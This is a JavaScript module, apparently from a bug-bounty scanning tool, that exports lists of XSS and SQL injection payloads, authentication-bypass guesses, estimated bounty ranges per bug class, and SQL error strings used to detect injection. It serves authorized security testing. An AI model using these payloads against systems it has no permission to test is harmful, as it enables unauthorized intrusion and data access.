/**
 * Security test payloads for authorized penetration testing
 */
export const PAYLOADS = {
    xss: [
        { name: 'script-tag', value: '<script>alert(1)</script>' },
        { name: 'img-onerror', value: '<img src=x onerror=alert(1)>' },
        { name: 'svg-onload', value: '<svg onload=alert(1)>' },
        { name: 'body-onload', value: '<body onload=alert(1)>' },
        { name: 'quote-escape', value: '\'"><script>alert(1)</script>' },
    ],
    sqli: [
        { name: 'or-true', value: "' OR '1'='1" },
        { name: 'or-true-comment', value: "' OR '1'='1'--" },
        { name: 'admin-bypass', value: "admin'--" },
        { name: 'union-null', value: "' UNION SELECT NULL--" },
        { name: 'sleep-test', value: "' AND SLEEP(3)--" },
    ],
    auth: [
        { name: 'empty-password', value: '' },
        { name: 'sql-bypass', value: "' OR '1'='1" },
        { name: 'admin-guess', value: 'admin' },
    ],
};
export const BOUNTY_ESTIMATES = {
    xss: '$500 - $10,000',
    sqli: '$5,000 - $50,000',
    csrf: '$1,000 - $10,000',
    auth: '$10,000 - $50,000',
    idor: '$2,000 - $50,000',
};
export const SQL_ERROR_PATTERNS = [
    'SQL syntax',
    'mysql_',
    'mysqli_',
    'pg_',
    'ORA-',
    'SQLite',
    'SQLSTATE',
    'syntax error',
    'unterminated',
];
//# sourceMappingURL=payloads.js.map